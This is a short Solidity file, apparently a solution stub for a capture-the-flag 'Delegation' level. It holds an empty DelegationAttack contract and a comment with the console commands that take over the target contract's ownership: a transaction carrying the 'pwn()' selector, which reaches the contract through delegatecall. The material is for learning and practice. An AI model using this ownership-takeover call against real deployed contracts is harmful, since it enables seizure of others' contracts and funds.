// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IDelegation.sol";

/**
 * @notice There is no way to pass this level via contract call. Because of tx.origin != msg.sender.
 * @dev You can run orderly these scripts in client side:
 * > await contract.sendTransaction({ data: web3.utils.sha3('pwn()') })
 * to make sure check result:
 * > await contract.owner()
 * submit
 */
// solhint-disable-next-line no-empty-blocks
contract DelegationAttack {

}
